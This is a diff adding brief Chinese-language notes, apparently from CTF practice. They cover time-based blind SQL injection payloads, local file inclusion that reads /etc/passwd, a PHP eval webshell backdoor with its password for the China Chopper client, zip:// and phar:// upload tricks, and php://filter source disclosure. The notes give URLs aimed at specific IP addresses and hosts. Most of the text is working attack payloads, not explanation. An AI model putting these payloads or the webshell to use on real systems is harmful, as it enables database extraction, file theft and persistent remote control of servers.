@@ -1,0 +1,24 @@
+使用时间盲注  主要用于不回显操作   例如向数据库中插入数据 或者删除数据 更新数据等
+
+insert into t_user(value,name,id) values(1,1+sleep(2),10);//这样就会产生一个时间的延迟
+使用ascii('a')即可获取到a的ascii码值
+数据库的if使用方式 if（a,b,c）判断a的真假  真返回b 假返回c
+ 或者使用判断的语句 select case when a then b else c end 判断a的真假 真返回b 假返回c
+ if(ascii(substr(database(),1,1)=100),sleep(1),NULL)
+select case when ascii(substring(select database() from 1 for 1))=100 then sleep(1) else null end 无逗号
+代替空格的方式可以使用/**/代替
+union select 1,2 limit 1 offset 显示第二行的内容
+
+上传的注入
+http://123.206.31.85:49166/index.php?file=hello.php
+file=/etc/passwd 即可查看改改为文件的内容
+如果<?php phpinfo(); ?>  格式过滤  
+可以使用<script /script>替换
+ <script language="php">@eval($_POST['sb'])</script>  注入后门可以使用菜刀获取信息 口令是sb
+使用上传一个压缩包 里面包含php文件
+http://106.12.37.37:10007/index.php?url=zip://upload/76721e6cfafe2d1c31b69ae5facd5394.zip%231
+http://106.12.37.37:10007/index.php?url=phar://upload/76721e6cfafe2d1c31b69ae5facd5394.zip/1
+php文件中可以写入后门
+
+//使用php://filter/convert.base64-encode/resource=show.php  即可查看show.php的源码
+http://chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=show.php
